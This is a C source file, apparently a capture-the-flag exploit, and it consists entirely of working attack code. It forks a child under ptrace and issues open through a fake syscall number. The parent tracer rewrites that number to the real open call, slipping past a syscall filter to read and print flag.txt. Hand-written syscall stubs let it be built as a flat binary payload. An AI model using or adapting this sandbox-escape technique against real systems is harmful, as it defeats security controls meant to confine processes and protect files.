// gcc -fomit-frame-pointer -fno-stack-protector -nostdlib -fPIE -masm=intel -c exploit.c && ld --oformat=binary exploit.o -o exploit.bin
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>

#define SYS_alt_open 0xdead

static void tracer(pid_t pid);
static int tracee(void);

int _open(const char *pathname, int flags);
long _ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);

void main(void){
	pid_t pid;

	switch(pid = fork()){
		case 0:
			tracee();
			break;
		case -1:
			exit(-1);
		default:
			tracer(pid);
			break;
	}

	exit(0);
}

static void tracer(pid_t pid){
	int status;

	waitpid(pid, &status, 0);
	if(WIFEXITED(status) || WIFSIGNALED(status))
		return;

	for(;;){
		struct user_regs_struct regs;

		_ptrace(PTRACE_SYSCALL, pid, NULL, 0);
		waitpid(pid, &status, 0);
		if(!(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP))
			break;

		if(_ptrace(PTRACE_GETREGS, pid, NULL, &regs))
			break;
		if(regs.orig_rax == SYS_alt_open){
			regs.orig_rax = SYS_open;
			_ptrace(PTRACE_SETREGS, pid, NULL, &regs);
		}
	}
}

static int tracee(void){
	int fd, n;
	char buf[512];

	if(_ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
		return -1;
	kill(getpid(), SIGSTOP);

	if((fd = _open("flag.txt", O_RDONLY)) == -1)
		return -1;
	n = read(fd, buf, sizeof(buf));
	write(STDOUT_FILENO, buf, n);

	return n;
}

int _open(const char *pathname, int flags){
	asm volatile ("syscall" :: "a"(SYS_alt_open));
}

ssize_t read(int fd, void *buf, size_t count){
	asm volatile ("syscall" :: "a"(SYS_read));
}

ssize_t write(int fd, const void *buf, size_t count){
	asm volatile ("syscall" :: "a"(SYS_write));
}

pid_t getpid(void){
	asm volatile ("syscall" :: "a"(SYS_getpid));
}

pid_t fork(void){
	asm volatile ("syscall" :: "a"(SYS_fork));
}

void exit(int status){
	asm volatile ("syscall" :: "a"(SYS_exit));
}

pid_t waitpid(pid_t pid, int *status, int options){
	asm volatile ("mov r10, 0\r\nsyscall" :: "a"(SYS_wait4));
}

int kill(pid_t pid, int sig){
	asm volatile ("syscall" :: "a"(SYS_kill));
}

long _ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data){
	asm volatile ("mov r10, rcx\r\nsyscall" :: "a"(SYS_ptrace));
}
